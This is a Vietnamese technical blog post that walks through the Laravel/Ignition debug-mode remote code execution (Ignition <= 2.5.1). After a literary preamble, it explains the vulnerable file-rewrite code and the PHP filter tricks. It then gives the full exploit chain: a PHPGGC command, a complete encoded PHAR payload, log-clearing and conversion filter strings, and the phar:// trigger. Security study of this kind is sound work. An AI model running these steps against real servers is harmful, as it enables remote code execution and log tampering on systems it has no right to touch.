# Tản mạn
"Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.

Tôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.

Những ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết. Nhưng mỗi lần thấy các bạn viết những nghiên cứu của bản thân mình để chia sẻ cho mọi người, lòng tôi lại tưng bừng rộn rã.

Buổi sáng mai hôm ấy, một buổi mai đầy sương thu và gió lạnh. Tôi âu yếm ngồi lên chiếc Sirius quen thuộc rồi đi trên những con phố Hà Nội đầy tấp nập. Con đường này tôi đã quen đi lại lắm lần, nhưng lần này tự nhiên tôi thấy lạ. Cảnh vật chung quanh tôi đều thay đổi, vì chính lòng tôi đang có sự thay đổi lớn: Hôm nay tôi đi làm"

Giữa cái thời tiết rét buốt đến độ mỗi sáng người ta sẽ đánh vật với lý trí của bản thân: dậy chuẩn bị đi làm hay xin Inlate 2 tiếng để đi ngủ thêm. Còn tôi thì vẫn như một thói quen, 6h sáng chiếc Google Home Mini đánh thức tôi dậy bằng bản nhạc "Giá như" của Chillies, một bài mà tôi rất thích trong thời gian gần đây. Trước khi rời khỏi chiếc chăn ấm của mình, đầu tiên tôi sẽ tìm cái điện thoại của mình và xem ngày hôm nay thế giới đã thay đổi được những gì, lướt 1 dạo thấy một bài Writeup vừa mới được public không lâu ở [Laravel <= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce). Tôi dần dần chú ý vào tiêu đề của bài viết và đọc một chút nội dung trong này. Chà! một bài viết thật công phu, sáng nay tôi lại có thứ mới để nghiên cứu rồi. Vậy là tôi chuẩn bị lên đường đi làm với một cảm xúc thật tươi vui. Hôm nay tôi đi làm.

> Tản mạn vậy đủ rồi, bài viết này là bài viết về kỹ thuật chứ không phải bài văn xuôi đâu :D

> Tất cả nội dung trong bài viết này được tham khảo trong bài viết https://www.ambionics.io/blog/laravel-debug-rce
# Laravel <= v8.4.2 debug mode: Remote code execution
Làm cái video cho nó tín cái đã
{@embed: https://vimeo.com/500275499}

Trong quá trình đi test các dự án của khách hàng, mình thường xuyên thấy cái mode debug này được bật, ngày xưa còn lấy được cả APP_KEYS rồi RCE luôn server test, được ngay cái báo cáo xịn, tuy nhiên đấy là câu chuyện của Laravel 5 trở xuống thôi, còn bây giờ từ Laravel 6 trở lên thì 
nó sử dụng [Ignition](https://github.com/facade/ignition) để hiển thị debug. Ignition được bật tự động trong Laravel 6 trở lên.

![](https://images.viblo.asia/0e04523b-a7cd-4c2d-a8f2-68ece609b5c6.png)

# Ignition <= 2.5.1
Ở đây mình có 1 file `hello.blade.php` có nội dung là `{{ $username }}`, nếu sử dụng một biến mà không được define thì nó sẽ trả về một lỗi như hình bên trên. Khi ta click vào `Make variable Optional` thì nó sẽ tự động replace `{{ $username }}` thành `{{ $username ? '' }}`. Kiểm tra log thì ta thấy được request như sau:

![](https://images.viblo.asia/fa3a378d-8120-4be0-9b05-f9cd84211639.png)

Những researcher ở Ambionics đã nghĩ đến các sử dụng chính tính năng này để có thể thay đổi nội dung của file bất kỳ

```./vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php
class MakeViewVariableOptionalSolution implements RunnableSolution
{
    ...

    public function run(array $parameters = [])
    {
        $output = $this->makeOptional($parameters);
        if ($output !== false) {
            file_put_contents($parameters['viewFile'], $output);
        }
    }

    public function makeOptional(array $parameters = [])
    {
        $originalContents = file_get_contents($parameters['viewFile']); // [1]
        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) { // [3]
            return false;
        }

        return $newContents;
    }

    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
    {
        $expectedTokens = [];
        foreach ($originalTokens as $token) {
            $expectedTokens[] = $token;
            if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
            }
        }

        return $expectedTokens;
    }

    ...
}
```

Sau khi đọc được file path truyền vào [1]  và thay thế `$variableName` thành `variableName ?? "` cả file ban đầu và file mới đều sẽ được mã hóa [2] và file ban đầu được thay thế bằng nội dung mới của nó. Nếu không, `makeOptional` sẽ trả về `false` [3] và file mới sẽ không được ghi. Do đó, không thể làm được gì nhiều khi sử dụng `variableName`.

Input variable duy nhất còn lại là `viewFile`, từ đoạn code trên có thể viết lại đoạn code rút gọn như sau:
```php
$contents = file_get_contents($parameters['viewFile']);
file_put_contents($parameters['viewFile'], $contents);
```

Đoạn code này lấy nội dung lấy từ `viewFile` rồi chèn trở lại `viewFile`. Chẳng để làm gì cả đúng không :upside_down_face:

# Log file to PHAR
## PHP wrappers: changing a file
Có một kỹ thuật được trình bày bởi Orange Tsai [http://blog.orange.tw/2018/10/](http://blog.orange.tw/2018/10/). Nó sử dụng `php:filter` để thay đổi nội dung của file trước khi được trả về. Và bây giờ có thể sử dụng kỹ thuật này để chuyển nội dung của file bằng cách sử dụng cách sau:
```bash
$ echo test | base64 | base64 > /path/to/file.txt
$ cat /path/to/file.txt
ZEdWemRBbz0K
```
```bash
$f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt';
# Reads /path/to/file.txt, base64-decodes it, returns the result
$contents = file_get_contents($f); 
# Base64-decodes $contents, then writes the result to /path/to/file.txt
file_put_contents($f, $contents); 
```
```bash
$ cat /path/to/file.txt
test
```
Vậy có thể sửa đổi nội dung file theo cách này, tuy nhiên chúng ta cần phải sửa đổi nội dung file chỉ được với 1 dòng duy nhất
```bash
# To base64-decode once, use:
$f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt';
# OR
$f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt';
```
Thậm chí file chứa những charset không nằm trong base64 (badchars) thì PHP bỏ qua những badchars này và vẫn decode như bình thường
```bash
$ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt
```
```bash
$f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt';
$contents = file_get_contents($f); 
file_put_contents($f, $contents); 
```
```bash
$ cat /path/to/file.txt
test
```
Vậy giờ chúng ta cần phải tìm được 1 file mà mình có thể control được thông tin ghi vào file, ở đây chính là file log mặc định của Laravel
## Write the log file
Theo mặc định, file log của Laravel chứa mọi lỗi PHP và stack trace, được lưu trong `storage/log/laravel.log`. Cố gắng tạo ra lỗi để được ghi lỗi vào file log =)).

```./storage/log/laravel.log
[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
[stacktrace]
#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions->handleError()
#1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents()
#2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->makeOptional()
#3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->run()
#4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController->__invoke()
[...]
#32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}()
#33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\Pipeline\\Pipeline->then()
#34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel->sendRequestThroughRouter()
#35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel->handle()
#36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...')
#37 {main}
"}
```
Vậy là chúng ta có thể có thể đưa nội dung tùy ý vào một file. Sau đó chuyển đổi file log thành file PHAR và sử dụng phar để RCE :smiley:

Tuy rằng nghe có vẻ dễ như vậy nhưng thật ra có rất nhiều vấn đề
## Convert file
Như ở trên, ta biết rằng PHP sẽ bỏ qua bất kỳ badchar nào khi sử dụng base64-decoding. Điều này đúng, ngoại trừ một character: `=`. Nếu bạn sử dụng `base64-decode filter` một chuỗi có chứa `=` ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.

Chúng ta có thể khắc phục được điều này nếu chúng ta có thể control được nội dung file đó. Tuy nhiên, payload chúng ta đưa vào file log chỉ là một phần rất nhỏ của nó. Ở mỗi đoạn log sẽ có 1 đoạn prefix (timestamp) -> Payload -> suffix (stack strace). Hơn nữa, payload lại xuất hiện2 lần trong file log như ví dụ dưới đây:

```./storage/logs/laravel.log
[2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {"exception":"
[object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
[stacktrace]
#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions->handleError(2, 'file_get_conten...', '/var/www/html/v...', 75, Array)
```

Sau nhiều lần thử nghiệm, những researcher của Ambionics đã tìm ra cách để loại bỏ các phần dư thừa để lấy được Payload. Ví dụ với trường hợp như sau:

```
[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
```

Cách mà họ sử dụng là sử dụng chuyển đổi bảng mã UTF-16 sang UTF-8. Vì cứ 2 byte thì sẽ được 1 char theo mã UTF-16 nên convert sang UTF-8 thì  `P\0` -> `P`. Còn các cặp 2 byte ở  prefix, midfix, suffix sẽ bị convert thành junk char giống như dưới đây (và phần junk này sau đó sẽ bị loại bỏ ở bước  base64 decoding):

```bash
echo -ne '[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]' > /tmp/test.txt
```
```php
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠
```

Ok, giờ ta đã giữ được nội dung của payload, bước tiếp theo là loại bỏ những ký tự nào không phải là ASCII là xong. Tuy nhiên có một vấn đề là nội dung Payload lại hiển thị 2 lần, chúng ta cần phải loại bỏ 1 cái đi mới đúng cấu trúc của file PHAR.
Để giải quyết vấn đề này ta lại nhớ lại là UTF-16 làm việc với hai byte, nên chỉ cần thêm 1 byte vào phần giữa Payload 1 và Payload 2 (như dưới đây là thêm `X` vào sau `D\0`)  thì byte aligment của Payload thứ 2 sẽ bị lệch, dẫn đến Payload 2 bị convert thành junk chars:

```bash
echo -ne '[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]' > /tmp/test.txt
```
```php
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠
```

Vậy, kết luận chúng ta sẽ có get chain cuối cùng là:

```php
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

## Complete exploit steps
#### Bước 1: Tạo PHPGGC payload và encode nó theo format trên:
```bash
php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g'
```
Chú ý, chỉnh sửa một chút ở phía đầu ra Payload, thay thế dấu `==` thành `=3D`. Mình cũng k hiểu vì sao Ambionics chạy được với 2 dấu `=` ở cuối payload, mình chạy toàn bị lỗi 
```
Warning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1
```
Sau một hồi anh em debug thì phát hiện ra phải sửa 1 dấu `=` thành `3D` thì chạy ngon nghẻ, nếu thấy xuất hiện lỗi 
```
Warning: file_get_contents(): iconv stream filter ("utf-16le"=>"utf-8"): invalid multibyte sequence in php shell code on line 1
```
thì phải đệm thêm 1 byte `=00` vào để decode được nhé. 
#### Bước 2: Xoá log
```php
viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```
> Chẳng hiểu kiểu gì bạn với sếp mình dùng cách này xoá được log mà mình phải dùng cách khác để xoá log >.<
#### Bước 3: Tạo log chứa payload
```php
viewFile: P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00F=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00u=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00f=00Q=00U=00A=00A=00A=00B=00k=00d=00W=001=00t=00e=00Q=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00H=00R=00l=00c=003=00R=000=00Z=00X=00N=000=00C=00Q=00/=006=00k=00s=000=00G=00x=00r=00d=00l=00r=00x=00x=007=00q=00r=009=003=00V=00/=00X=00T=002=00F=00k=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00
```

#### Bước 4: Convert file log sang file PHAR

```php
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

Chú ý, ở bước này có thể sử dụng `utf-16le` hoặc `utf-16be`, tuỳ theo các nào được nhé

> Mình sử dụng cách này để xóa log, khi mà nó hoạt động chính xác, sẽ k tìm thấy đoạn base64 nào cả nên output trả về là không có gì, thành ra xóa được log. Gửi request 1 lần k được thì thử vài lần xem sao nhé.

#### Bước 5: Chạy PHAR deserialization

```php
viewFile: phar:///path/to/storage/logs/laravel.log
```

Và ta được thành quả

![](https://images.viblo.asia/d5d7bbc8-a105-402b-8056-e35dcb1432e6.png)

# Exploit PoC
Nếu ai muốn thử nghiệm thì đợi mình build xong Docker rồi chạy nhé, tạm thời dùng tạm cái này đã nha 
```bash
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve
```
Chúng mình có viết xong PoC exploit ở đây, hi vọng có ích cho mọi người ;)

Github: https://github.com/khanhnv-2091/laravel-8.4.2-rce

Cảm ơn anh @vigov5 và @com0tf3 đã hỗ trợ nghiên cứu CVE này.
# Tham khảo
- https://www.ambionics.io/blog/laravel-debug-rce

> Bài chưa hết ở đây  nhớ, còn phần 2 :D